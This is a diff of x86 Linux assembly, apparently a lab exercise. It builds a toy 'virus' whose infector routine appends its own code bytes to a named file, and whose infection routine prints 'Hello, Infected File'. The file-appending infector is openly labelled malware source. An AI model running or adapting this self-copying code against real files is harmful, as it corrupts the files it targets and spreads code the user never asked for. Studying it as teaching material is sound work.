@@ -1,113 +1,109 @@
-section .data
-    hello_msg:  db "Hello, Infected File", 10   ; message + newline
-    hello_len:  equ $ - hello_msg               ; length = 21
-
 section .text
-    global _start
-    global system_call
-    global infection
-    global infector
-    global code_start
-    global code_end
-    extern main
+global _start
+global system_call
+global infection
+global infector
+global code_start
+global code_end
+extern main
 
-; Entry point - sets up stack and calls main
 _start:
-    pop     dword ecx              ; argc
-    mov     esi, esp               ; argv pointer
-    push    esi                    ; push argv
-    push    ecx                    ; push argc
-    call    main
+    pop    dword ecx    ; ecx = argc
+    mov    esi,esp      ; esi = argv
+    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+    mov     eax,ecx     ; put the number of arguments into eax
+    shl     eax,2       ; compute the size of argv in bytes
+    add     eax,esi     ; add the size to the address of argv
+    add     eax,4       ; skip NULL at the end of argv
+    push    dword eax   ; char *envp[]
+    push    dword esi   ; char* argv[]
+    push    dword ecx   ; int argc
 
-    ; Exit with return value from main
-    mov     ebx, eax               ; exit code
-    mov     eax, 1                 ; sys_exit
+    call    main        ; int main( int argc, char *argv[], char *envp[] )
+
+    mov     ebx,eax
+    mov     eax,1
     int     0x80
+    nop
 
-; System call wrapper (CDECL calling convention)
-; int system_call(int syscall_num, int arg1, int arg2, int arg3)
 system_call:
-    push    ebp
+    push    ebp             ; Save caller state
     mov     ebp, esp
-    push    ebx
-    push    ecx
-    push    edx
+    sub     esp, 4          ; Leave space for local var on stack
+    pushad                  ; Save some more caller state
 
-    mov     eax, [ebp+8]           ; syscall number
-    mov     ebx, [ebp+12]          ; arg1
-    mov     ecx, [ebp+16]          ; arg2
-    mov     edx, [ebp+20]          ; arg3
-    int     0x80
-
-    pop     edx
-    pop     ecx
-    pop     ebx
-    pop     ebp
-    ret
+    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
+    mov     ebx, [ebp+12]   ; Next argument...
+    mov     ecx, [ebp+16]   ; Next argument...
+    mov     edx, [ebp+20]   ; Next argument...
+    int     0x80            ; Transfer control to operating system
+    mov     [ebp-4], eax    ; Save returned value...
+    popad                   ; Restore caller state (registers)
+    mov     eax, [ebp-4]    ; place returned value where caller can see it
+    add     esp, 4          ; Restore caller state
+    pop     ebp             ; Restore caller state
+    ret                     ; Back to caller
 
 ; ============================================
-; Virus code section
+; Virus code section - between code_start and code_end
 ; ============================================
 
 code_start:
 
 ; void infection(void)
-; Prints "Hello, Infected File" to stdout
+; Prints "Hello, Infected File" to stdout using one system call
 infection:
     push    ebp
     mov     ebp, esp
-    push    ebx
+    pushad
 
-    ; sys_write(1, hello_msg, hello_len)
-    mov     eax, 4                 ; sys_write
-    mov     ebx, 1                 ; stdout
-    mov     ecx, hello_msg         ; message
-    mov     edx, hello_len         ; length
+    mov     eax, 4              ; sys_write
+    mov     ebx, 1              ; stdout
+    mov     ecx, hello_msg      ; message
+    mov     edx, 21             ; length of "Hello, Infected File\n"
     int     0x80
 
-    pop     ebx
+    popad
     pop     ebp
     ret
 
 ; void infector(char *filename)
-; Opens file in append mode, writes code_start to code_end, closes file
+; Opens file for append, writes code_start to code_end, closes file
 infector:
     push    ebp
     mov     ebp, esp
-    push    ebx
-    push    esi
+    pushad
 
-    ; sys_open(filename, O_WRONLY|O_APPEND, 0)
-    ; O_WRONLY = 1, O_APPEND = 0x400 => 0x401
-    mov     eax, 5                 ; sys_open
-    mov     ebx, [ebp+8]           ; filename
-    mov     ecx, 0x401             ; O_WRONLY | O_APPEND
-    mov     edx, 0644o             ; permissions (ignored for existing file)
+    ; open(filename, O_WRONLY|O_APPEND, 0)
+    mov     eax, 5              ; sys_open
+    mov     ebx, [ebp+8]        ; filename
+    mov     ecx, 0x401          ; O_WRONLY | O_APPEND
+    mov     edx, 0
     int     0x80
 
-    ; Check for error
     cmp     eax, 0
-    jl      .infector_done
+    jl      .infector_end
+    mov     esi, eax            ; save fd
 
-    mov     esi, eax               ; save file descriptor
-
-    ; sys_write(fd, code_start, code_end - code_start)
-    mov     eax, 4                 ; sys_write
-    mov     ebx, esi               ; file descriptor
-    mov     ecx, code_start        ; buffer start
+    ; write(fd, code_start, code_end - code_start)
+    mov     eax, 4              ; sys_write
+    mov     ebx, esi            ; fd
+    mov     ecx, code_start     ; buffer
     mov     edx, code_end
-    sub     edx, code_start        ; length = code_end - code_start
+    sub     edx, code_start     ; length
     int     0x80
 
-    ; sys_close(fd)
-    mov     eax, 6                 ; sys_close
-    mov     ebx, esi               ; file descriptor
+    ; close(fd)
+    mov     eax, 6              ; sys_close
+    mov     ebx, esi            ; fd
     int     0x80
 
-.infector_done:
-    pop     esi
-    pop     ebx
+.infector_end:
+    popad
     pop     ebp
     ret
 
 code_end:
+
+section .data
+    hello_msg: db "Hello, Infected File", 10
